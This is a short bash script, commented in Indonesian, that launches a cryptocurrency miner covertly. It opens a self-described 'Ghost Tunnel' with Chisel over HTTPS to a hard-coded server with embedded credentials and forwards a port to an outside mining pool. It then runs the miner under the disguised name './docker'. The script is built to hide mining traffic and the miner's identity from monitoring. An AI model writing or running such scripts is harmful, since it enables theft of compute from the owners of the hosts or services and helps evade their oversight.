#!/bin/bash

# --- KONFIGURASI ---
IP_UBUNTU="45.115.224.184"

echo "Membuka The Ghost Tunnel (Chisel HTTPS)..."

# 1. Jalankan Chisel dan simpan log-nya ke file
# Kita pakai --tls-skip-verify dan --auth
/usr/local/bin/chisel client --tls-skip-verify --auth "mineruser:minerpass123" https://$IP_UBUNTU:443 4629:dagnam.xyz:4629 > chisel.log 2>&1 &

# 2. Tunggu sebentar dan cek apakah Chisel sudah jalan
sleep 10
echo "--- Log Chisel ---"
cat chisel.log
echo "------------------"

# 3. Cek apakah port 4629 sudah terbuka
if ! ss -tulpn | grep :4629; then
    echo "ERROR: Port 4629 belum terbuka. Chisel mungkin gagal menyambung."
fi

echo "Menjalankan Miner..."
# 4. Jalankan miner
./docker -c docker.json -o stratum+tcp://127.0.0.1:4629 -t 1
